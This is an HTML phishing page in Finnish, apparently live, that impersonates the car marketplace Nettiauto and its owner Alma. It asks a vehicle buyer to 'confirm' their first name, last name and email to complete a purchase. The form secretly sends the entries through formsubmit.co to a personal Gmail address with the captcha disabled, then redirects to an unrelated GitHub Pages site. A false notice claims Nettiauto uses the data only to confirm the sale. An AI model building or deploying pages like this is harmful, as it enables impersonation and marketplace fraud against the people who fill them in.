<!DOCTYPE html>
<html lang="fi">
<head> 
<meta charset="UTF-8">
<title>Vahvista tietosi</title>

<style>
    .na-header {
    background: #FFFFFF;
    border-bottom: 1px solid #e6e6e6;
    height: 64px;
    display: flex;
    align-items: center;
}

.na-header-inner {
    max-width: 1200px;
    width: 100%;
    margin: 0 auto;
    padding: 0 20px;
    display: flex;
    align-items: center;
}

.na-logo {
    height: 34px;
}

body {
    margin: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
    background-color: #f5f7fa;
    color: #1a1a1a;
}

.header {
    background: #ffffff;
    border-bottom: 1px solid #e0e0e0;
    padding: 15px 0;
}

.header img {
    height: 40px;
    margin-left: 20px;
}

.container {
    max-width: 520px;
    margin: 40px auto;
    background: #ffffff;
    border-radius: 8px;
    padding: 30px;
    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
}

h1 {
    font-size: 22px;
    margin-bottom: 10px;
}

.description {
    font-size: 14px;
    color: #555;
    margin-bottom: 25px;
}

label {
    display: block;
    font-weight: 600;
    margin-top: 15px;
    font-size: 14px;
}

input {
    width: 100%;
    padding: 12px;
    margin-top: 6px;
    border-radius: 6px;
    border: 1px solid #cfd6e0;
    font-size: 14px;
}

input:focus {
    outline: none;
    border-color: #0072ce;
}

button {
    width: 100%;
    margin-top: 25px;
    padding: 14px;
    background-color: #0072ce;
    color: #ffffff;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 6px;
    cursor: pointer;
}

button:hover {
    background-color: #005fa3;
}

.notice {
    margin-top: 20px;
    font-size: 12px;
    color: #666;
    line-height: 1.4;
}
</style>
</head>

<body>

<!-- HEADER -->
<!-- HEADER -->
<header class="na-header">
  <div class="na-header-inner">
    <img src="logo.png" alt="Alma Ajo" class="na-logo">
  </div>
</header>


<!-- FORM -->
<div class="container">

    <h1>Vahvista ostajan tiedot</h1>
    <div class="description">
        Täytä alla olevat tiedot viimeistelläksesi ajoneuvokaupan.
    </div>

    <form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">

        <label>Etunimi</label>
        <input type="text" name="Etunimi" required>

        <label>Sukunimi</label>
        <input type="text" name="Sukunimi" required>

        <label>Sähköpostiosoite</label>
        <input type="email" name="Email" required>

        <input type="hidden" name="_subject" value="Uusi Nettiauto vahvistus">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">

        <button type="submit">Vahvista tiedot</button>
    </form>

    <div class="notice">
        Nettiauto käyttää tietoja ainoastaan kaupan vahvistamiseen.
    </div>

</div>

</body>
</html>
